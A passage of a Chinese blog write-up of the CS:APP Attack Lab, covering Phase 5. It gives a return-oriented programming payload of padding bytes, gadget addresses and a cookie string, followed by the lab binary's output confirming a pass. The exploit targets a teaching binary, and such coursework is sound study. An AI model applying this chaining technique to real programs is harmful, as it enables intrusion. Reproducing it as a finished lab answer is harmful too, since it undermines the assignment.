align=center>(test函数栈帧)</td><td align=center></td><td align=center></td></tr><tr><td align=center>0x401a06</td><td align=center>gadget address 1</td><td align=center></td></tr><tr><td align=center>(getbuff函数栈帧)</td><td align=center></td><td align=center></td></tr><tr><td align=center>40字节buffer</td><td align=center>任意填充字符</td><td align=center></td></tr></tbody></table><p>根据以上设计,填充的字符串为</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>/* Phase5 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#e1e4e8>/* 以上共40字节 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span style=--0:#e1e4e8>06 1a 40 00 00 00 00 00 /* gadget address 1 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span style=--0:#e1e4e8>a2 19 40 00 00 00 00 00 /* gadget address 2 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span style=--0:#e1e4e8>ab 19 40 00 00 00 00 00 /* gadget address 3 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span style=--0:#e1e4e8>48 00 00 00 00 00 00 00 /* 偏移量:8*9 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span style=--0:#e1e4e8>dd 19 40 00 00 00 00 00 /* gadget address 4 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>12</div></div><div class=code><span style=--0:#e1e4e8>34 1a 40 00 00 00 00 00 /* gadget address 5 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>13</div></div><div class=code><span style=--0:#e1e4e8>13 1a 40 00 00 00 00 00 /* gadget address 6 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>14</div></div><div class=code><span style=--0:#e1e4e8>d6 19 40 00 00 00 00 00 /* gadget address 7 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>15</div></div><div class=code><span style=--0:#e1e4e8>a2 19 40 00 00 00 00 00 /* gadget address 8 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>16</div></div><div class=code><span style=--0:#e1e4e8>fa 18 40 00 00 00 00 00 /* touch3 address */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>17</div></div><div class=code><span style=--0:#e1e4e8>35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="/* Phase5 */ff ff ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff ff ff/* 以上共40字节 */06 1a 40 00 00 00 00 00 /* gadget address 1 */a2 19 40 00 00 00 00 00 /* gadget address 2 */ab 19 40 00 00 00 00 00 /* gadget address 3 */48 00 00 00 00 00 00 00 /* 偏移量:8*9 */dd 19 40 00 00 00 00 00 /* gadget address 4 */34 1a 40 00 00 00 00 00 /* gadget address 5 */13 1a 40 00 00 00 00 00 /* gadget address 6 */d6 19 40 00 00 00 00 00 /* gadget address 7 */a2 19 40 00 00 00 00 00 /* gadget address 8 */fa 18 40 00 00 00 00 00 /* touch3 address */35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */" data-copied=Copied!><div></div></button></div></figure></div><p>大功告成!</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>$</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>./rtarget</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-qi</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase5-raw</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Cookie:</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>0x59b997fa</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#B392F0>Touch3!:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>You</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>called</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch3</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>"59b997fa"</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#B392F0>Valid</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>solution</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>level</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>3</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>with</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>target</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>rtarget</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#B392F0>PASS:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Would</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>have</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>posted</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>the</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>following:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>user</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>id</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>bovik</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>course</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>15213-f15</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>lab</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>attacklab</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>result</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>1:PASS:0xffffffff:rtarget:3:FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>06</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>1A</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>A2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>19</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>AB</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>19</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>DD</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>19</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>34</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>1A</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>13</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>1A</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>D6</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>19</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>A2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>19</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FA</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>18</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>35</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>39</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>62</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>39</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>39</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>37</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>66</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>61</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="$ ./rtarget -qi Phase5-rawCookie: 0x59b997faTouch3!: You called touch3(&#x22;59b997fa&#x22;)Valid solution for level 3 with target rtargetPASS: Would have posted the following:        user id bovik        course  15213-f15        lab     attacklab        result  1:PASS:0xffffffff:rtarget:3:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00" data-copied=Copied!><div></div></button></div></figure></div><h1 id=总结>总结</h1><p>我看网上不少名校的学生都焦头烂额的实验,我独立完成,真是天才如我.只觉得CTF的什么逆向,pwn,也不过如此.</p><hr data-astro-cid-zux26muy><div class="container p-0" data-astro-cid-zux26muy><div class="text-sm italic mb-2 text-base-content/60 text-right" data-astro-cid-zux26muy><svg height=1em width=1em data-icon=ri:heart-line class="h-4 w-4 align-text-bottom inline-block text-error" data-astro-cid-zux26muy=true><symbol id=ai:ri:heart-line viewBox="0 0 24 24"><path d="M12.001 4.529a6 6 0 0 1 8.242.228a6 6 0 0 1 .236 8.236l-8.48 8.492l-8.478-8.492a6 6 0 0 1 8.48-8.464m6.826 1.641a4 4 0 0 0-5.49-.153l-1.335 1.198l-1.336-1.197a4 4 0 0 0-5.686 5.605L12 18.654l7.02-7.03a4 4 0 0 0-.193-5.454" fill=currentColor /></symbol><use href=#ai:ri:heart-line></use></svg> Thanks for reading!</div><div class="bg-base-200 card overflow-visible" data-astro-cid-zux26muy><div class="relative p-4 card-body lg:p-8 sm:p-6" data-astro-cid-zux26muy><div class="-top-8 absolute left-8" data-astro-cid-zux26muy><div class="flex items-center justify-center bg-primary h-16 rounded-full shadow-lg w-16" data-astro-cid-zux26muy><svg height=1em width=1em data-icon=ri:creative-commons-line class="h-10 text-primary-content w-10" data-astro-cid-zux26muy=true><symbol id=ai:ri:creative-commons-line viewBox="0 0 24 24"><path d="M9 8c1.104 0 2.105.448 2.829 1.173l-1.414 1.413a2 2 0 1 0 0 2.828l1.413 1.414A4.001 4.001 0 0 1 5 12c0-2.208 1.792-4 4-4m9.829 1.173A4.001 4.001 0 0 0 12 12a4.001 4.001 0 0 0 6.828 2.828l-1.414-1.414a2 2 0 1 1 0-2.828zM2 12C2 6.477 6.477 2 12 2s10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12m10-8a8 8 0 1 0 0 16a8 8 0 0 0 0-16" fill=currentColor /></symbol><use href=#ai:ri:creative-commons-line></use></svg></div></div><div class=space-y-4 data-astro-cid-zux26muy><h3 class="sm:text-xl font-bold text-lg lg:text-2xl" data-astro-cid-zux26muy>Attacklab</h3><div class="flex flex-wrap gap-2 opacity-75 sm:gap-4 sm:text-sm text-xs" data-astro-cid-zux26muy><span class="flex items-center gap-1" data-astro-cid-zux26muy><svg height=1em width=1em data-icon=lucide:calendar class="h-4 w-4" viewBox="0 0 24 24" data-astro-cid-zux26muy=true><use href=#ai:lucide:calendar></use></svg> Fri Jan 24 2025</span><div class="flex items-center gap-1" data-astro-cid-zux26muy><svg height=1em width=1em data-icon=lucide:book-open class="h-4 w-4" viewBox="0 0 24 24" data-astro-cid-zux26muy=true><use href=#ai:lucide:book-open></use></svg> <span data-astro-cid-zux26muy>4055 words · 26 minutes</span></div><a href=https://tankimzeg.top/csapp/attacklab class="flex items-center gap-1 hover:text-primary transition-colors" data-astro-cid-zux26muy><svg height=1em width=1em data-icon=ri:links-line class="h-4 w-4" data-astro-cid-zux26muy=true><symbol id=ai:ri:links-line viewBox="0 0 24 24"><path d="m13.06 8.111l1.415 1.414a7 7 0 0 1 0 9.9l-.354.353a7 7 0 1 1-9.9-9.9l1.415 1.415a5 5 0 1 0 7.071 7.071l.354-.354a5 5 0 0 0 0-7.07l-1.415-1.415zm6.718 6.01l-1.414-1.414a5 5 0 0 0-7.071-7.07l-.354.353a5 5 0 0 0 0 7.07l1.415 1.415l-1.415 1.414l-1.414-1.414a7 7 0 0 1 0-9.9l.354-.353a7 7 0 1 1 9.9 9.9" fill=currentColor /></symbol><use href=#ai:ri:links-line></use></svg></a></div><div class=mt-4 data-astro-cid-zux26muy><div class="flex items-center flex-wrap gap-2"><a href=/blog/category/tech class="btn btn-xs btn-category"><svg height=1em width=1em data-icon=lucide:folder class="h-4 w-4" viewBox="0 0 24 24"><use href=#ai:lucide:folder></use></svg> <span>tech</span> </a><a href=/blog/tag/csapp class="btn btn-xs btn-tag"><svg height=1em width=1em data-icon=lucide:tag class="h-4 w-4" viewBox="0 0 24 24"><use href=#ai:lucide:tag></use></svg> <span>csapp</span> </a><a href=/blog/tag/csapplab class="btn btn-xs btn-tag"><svg height=1em width=1em data-icon=lucide:tag class="h-4 w-4" viewBox="0 0 24 24"><use href=#ai:lucide:tag></use></svg> <span>csapplab</span></a></div><hr data-astro-cid-zux26muy class=my-4><p class="text-sm opacity-75" data-astro-cid-zux26muy></p>© TanKimzeg | <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed class="hover:text-primary transition-colors" target=_blank data-astro-cid-zux26muy rel="noopener noreferrer">CC BY-NC-SA 4.0</a></div></div><div class="flex justify-end mt-4" data-astro-cid-zux26muy><button class="btn btn-outline btn-primary" data-astro-cid-zux26muy onclick=share_modal.showModal()>Share <svg height=1em width=1em data-icon=ri:share-line class="h-5 w-5" data-astro-cid-zux26muy=true><symbol id=ai:ri:share-line viewBox="0 0 24 24"><path d="m13.12 17.023l-4.199-2.29a4 4 0 1 1 0-5.465l4.2-2.29a4 4 0 1 1 .958 1.755l-4.2 2.29a4 4 0 0 1 0 1.954l4.2 2.29a4 4 0 1 1-.959 1.755M6 14a2 2 0 1 0 0-4a2 2 0 0 0 0 4m11-6a2 2 0 1 0 0-4a2 2 0 0 0 0 4m0 12a2 2 0 1 0 0-4a2 2 0 0 0 0 4" fill=currentColor /></symbol><use href=#ai:ri:share-line></use></svg></button></div></div></div><dialog class="modal modal-bottom sm:modal-middle" id=share_modal data-astro-cid-zux26muy><div class="modal-box max-w-2xl rounded-none sm:rounded-xl" data-astro-cid-zux26muy><h3 class="mb-6 font-bold sm:text-xl text-center text-lg" data-astro-cid-zux26muy>Share this article</h3><div class="flex justify-center flex-wrap gap-4" data-astro-cid-zux26muy><a href="https://twitter.com/intent/tweet/?text=Attacklab&url=https://tankimzeg.top/csapp/attacklab" class="btn btn-circle hover:scale-110 btn-lg transition-transform bg-black hover:bg-gray-800" target=_blank data-astro-cid-zux26muy rel="noopener noreferrer" title="X (Twitter)"><span class=sr-only data-astro-cid-zux26muy>X (Twitter)</span> <svg height=1em width=1em data-icon=ri:twitter-x-line class="h-6 text-white w-6" data-astro-cid-zux26muy=true><symbol id=ai:ri:twitter-x-line viewBox="0 0 24 24"><path d="M10.488 14.651L15.25 21h7l-7.858-10.478L20.93 3h-2.65l-5.117 5.886L8.75 3h-7l7.51 10.015L2.32 21h2.65zM16.25 19L5.75 5h2l10.5 14z" fill=currentColor /></symbol><use href=#ai:ri:twitter-x-line></use></svg> </a><a href="https://telegram.me/share/url?text=Attacklab&url=https://tankimzeg.top/csapp/attacklab" class="btn btn-circle hover:scale-110 btn-lg transition-transform bg-[#26a5e4] hover:bg-[#1e96d1]" target=_blank data-astro-cid-zux26muy rel="noopener noreferrer" title=Telegram><span class=sr-only data-astro-cid-zux26muy>Telegram</span> <svg height=1em width=1em data-icon=ri:telegram-line class="h-6 text-white w-6" data-astro-cid-zux26muy=true><symbol id=ai:ri:telegram-line viewBox="0 0 24 24"><path d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0m-8 10c5.523 0 10-4.477 10-10S17.523 2 12 2S2 6.477 2 12s4.477 10 10 10m.358-12.618q-1.458.607-5.831 2.513q-.711.282-.744.552c-.038.304.343.424.862.587l.218.07c.51.166 1.198.36 1.555.368q.486.01 1.084-.4q4.086-2.76 4.218-2.789c.063-.014.149-.032.207.02c.059.052.053.15.047.177c-.038.161-1.534 1.552-2.308 2.271q-.344.324-.683.653c-.474.457-.83.8.02 1.36c.861.568 1.73 1.134 2.57 1.733c.414.296.786.56 1.246.519c.267-.025.543-.276.683-1.026c.332-1.77.983-5.608 1.133-7.19a1.8 1.8 0 0 0-.017-.393a.42.42 0 0 0-.142-.27c-.12-.098-.305-.118-.387-.117c-.376.007-.953.207-3.73 1.362" fill=currentColor /></symbol><use href=#ai:ri:telegram-line></use></svg> </a><a href="https://reddit.com/submit/?url=https://tankimzeg.top/csapp/attacklab&title=Attacklab" class="btn btn-circle hover:scale-110 btn-lg transition-transform bg-[#ff4500] hover:bg-[#e63e00]" target=_blank data-astro-cid-zux26muy rel="noopener noreferrer" title=Reddit><span class=sr-only data-astro-cid-zux26muy>Reddit</span> <svg height=1em width=1em data-icon=ri:reddit-line class="h-6 text-white w-6" data-astro-cid-zux26muy=true><symbol id=ai:ri:reddit-line viewBox="0 0 24 24"><path d="m11.053 7.815l.751-3.536a2 2 0 0 1 2.372-1.54l3.196.68a2 2 0 1 1-.415 1.956l-3.197-.68l-.666 3.135c1.785.137 3.558.73 5.164 1.7A3.192 3.192 0 0 1 23 12.203v.021a3.2 3.2 0 0 1-1.207 2.55l-.008.123c0 3.998-4.45 7.03-9.799 7.03c-5.333 0-9.708-3.024-9.705-6.953l-.01-.181a3.193 3.193 0 0 1 3.454-5.35a11.45 11.45 0 0 1 5.329-1.628m9.285 5.526a1.19 1.19 0 0 0 .662-1.075a1.192 1.192 0 0 0-2.016-.806l-.585.56l-.67-.455c-1.615-1.098-3.452-1.725-5.23-1.764h-1.006c-1.875.028-3.652.6-5.237 1.675l-.664.45l-.583-.55a1.192 1.192 0 1 0-1.315 1.952l.633.29l-.053.695a4 4 0 0 0 .003.584c0 2.71 3.356 5.03 7.708 5.03c4.371 0 7.799-2.336 7.802-5.107a3 3 0 0 0 0-.507l-.052-.672zM6.951 13.5a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0m7 0a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0m-1.985 5.103c-1.397 0-2.766-.37-3.881-1.21a.424.424 0 0 1 .597-.597c.945.693 2.123.99 3.269.99s2.33-.275 3.284-.959a.44.44 0 0 1 .732.206a.47.47 0 0 1-.12.423c-.683.797-2.483 1.147-3.88 1.147" fill=currentColor /></symbol><use href=#ai:ri:reddit-line></use></svg> </a><a href="https://facebook.com/sharer/sharer.php?u=https://tankimzeg.top/csapp/attacklab" class="btn btn-circle hover:scale-110 btn-lg transition-transform bg-[#0866ff] hover:bg-[#0755d6]" target=_blank data-astro-cid-zux26muy rel="noopener noreferrer" title=Facebook><span class=sr-only data-astro-cid-zux26muy>Facebook</span> <svg height=1em width=1em data-icon=ri:facebook-circle-line class="h-6 text-white w-6" data-astro-cid-zux26muy=true><symbol id=ai:ri:facebook-circle-line viewBox="0 0 24 24"><path d="M13.001 19.938a8.001 8.001 0 0 0-1-15.938a8 8 0 0 0-1 15.938V14h-2v-2h2v-1.654c0-1.337.14-1.822.4-2.311A2.73 2.73 0 0 1 12.537 6.9c.382-.205.857-.328 1.687-.381q.494-.032 1.278.08v1.9h-.5c-.917 0-1.296.043-1.522.164a.73.73 0 0 0-.314.314c-.12.226-.164.45-.164 1.368V12h2.5l-.5 2h-2zm-1 2.062c-5.523 0-10-4.477-10-10s4.477-10 10-10s10 4.477 10 10s-4.477 10-10 10" fill=currentColor /></symbol><use href=#ai:ri:facebook-circle-line></use></svg> </a><a href="mailto:?subject=Attacklab&#38;body=https://tankimzeg.top/csapp/attacklab" class="btn btn-circle hover:scale-110 btn-lg transition-transform bg-gray-600 hover:bg-gray-700" target=_blank data-astro-cid-zux26muy rel="noopener noreferrer" title=Email><span class=sr-only data-astro-cid-zux26muy>Email</span> <svg height=1em width=1em data-icon=ri:mail-line class="h-6 text-white w-6" data-astro-cid-zux26muy=true><symbol id=ai:ri:mail-line viewBox="0 0 24 24"><path d="M3 3h18a1 1 0 0 1 1 1v16a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1m17 4.238l-7.928 7.1L4 7.216V19h16zM4.511 5l7.55 6.662L19.502 5z" fill=currentColor /></symbol><use href=#ai:ri:mail-line></use></svg></a></div><div class=modal-action data-astro-cid-zux26muy><form method=dialog data-astro-cid-zux26muy><button class="btn btn-ghost hover:scale-105 transition-transform" data-astro-cid-zux26muy>Close</button></form></div></div><form method=dialog class=modal-backdrop data-astro-cid-zux26muy><button data-astro-cid-zux26muy>Close</button></form></dialog></div></div></div></div></div><script type=module>document.addEventListener("astro:page-load",(()=>{const t=document.querySelectorAll(".dropdown label"),e=document.querySelectorAll(".dropdown-content");t.forEach(((t,a)=>{t.addEventListener("click",(()=>{const t=e[a];"closed"===t.getAttribute("data-state")?(t.setAttribute("data-state","open"),t.classList.add("scale-100","opacity-100"),t.classList.remove("scale-90","opacity-0")):(t.setAttribute("data-state","closed"),t.classList.add("scale-90","opacity-0"),t.classList.remove("scale-100","opacity-100"))}))}))}))</script></div><footer class="bg-base-100 shadow-lg rounded-xl footer p-10"><aside><svg height=50 width=50 class=fill-current viewBox="0 0 24 24" clip-rule=evenodd fill-rule=evenodd 